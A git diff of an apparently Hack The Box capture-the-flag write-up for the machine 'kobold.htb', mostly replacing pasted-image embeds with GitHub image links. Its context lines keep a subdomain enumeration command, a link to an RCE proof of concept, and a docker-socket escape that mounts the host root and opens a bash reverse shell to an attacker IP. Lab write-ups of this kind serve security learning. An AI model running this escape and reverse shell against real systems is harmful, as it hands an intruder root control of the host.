@@ -1,4 +1,5 @@
-![[Pasted image 20260802013213.png]]
+<img width="1592" height="325" alt="image" src="https://github.com/user-attachments/assets/99a6c452-ed69-4c65-859b-571bf26f50ed" />
+
 
 
 ```
@@ -35,22 +36,27 @@ Nmap done: 1 IP address (1 host up) scanned in 33.82 seconds
 ```
 
 
-![[Pasted image 20260801232718.png]]
+<img width="1913" height="736" alt="image" src="https://github.com/user-attachments/assets/b933e69e-802f-4e07-a719-34ce2701c8c6" />
+
 
 
 ```
 gobuster vhost -u "https://kobold.htb/" -w "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt" --append-domain --no-tls-validation
 ```
 
-![[Pasted image 20260801234339.png]]
-
-![[Pasted image 20260801234407.png]]
-
-![[Pasted image 20260802004248.png]]
+<img width="1490" height="570" alt="image" src="https://github.com/user-attachments/assets/54f18f20-ee97-455c-9542-55243696b412" />
 
 
+<img width="1919" height="822" alt="image" src="https://github.com/user-attachments/assets/e2958873-8065-4820-ae2f-d33cd374e3dc" />
 
-![[Pasted image 20260802004330.png]]
+
+<img width="1914" height="470" alt="image" src="https://github.com/user-attachments/assets/c97b1e00-35e6-4d0b-83ca-8a345a5762e4" />
+
+
+
+
+<img width="897" height="773" alt="image" src="https://github.com/user-attachments/assets/8b1ef709-e0d4-4711-89a3-197a69ec71a9" />
+
 
 ```
 docker -H unix:///run/docker.sock run -u root -v /:/host --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 -c "chroot /host /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.60/4445 0>&1'"
@@ -65,9 +71,11 @@ https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC/blob/main/exp
 ```
 
 
-![[Pasted image 20260802012811.png]]
+<img width="891" height="686" alt="image" src="https://github.com/user-attachments/assets/98993040-eaf7-45df-84d7-33cffa94bba9" />
 
-![[Pasted image 20260802012822.png]]
+
+<img width="1903" height="399" alt="image" src="https://github.com/user-attachments/assets/3f2bb56a-2e94-4c24-a586-68d1860aaacc" />
+
 
 
 ```
@@ -172,14 +180,17 @@ root@68268d2f30b5:~#
 
 
 
-![[Pasted image 20260802013051.png]]
-
-
-
-![[Pasted image 20260802012950.png]]
+<img width="1911" height="779" alt="image" src="https://github.com/user-attachments/assets/b12b7d1a-9238-42af-8f28-9a323b1a0e74" />
 
 
 
 
-![[Pasted image 20260802013136.png]]
+<img width="656" height="465" alt="image" src="https://github.com/user-attachments/assets/417cae4e-c379-405d-a94e-d416a0a244c7" />
+
+
+
+
+
+<img width="718" height="788" alt="image" src="https://github.com/user-attachments/assets/a67e52ab-bc45-4dde-b764-19dd26fb3a9c" />
+
 
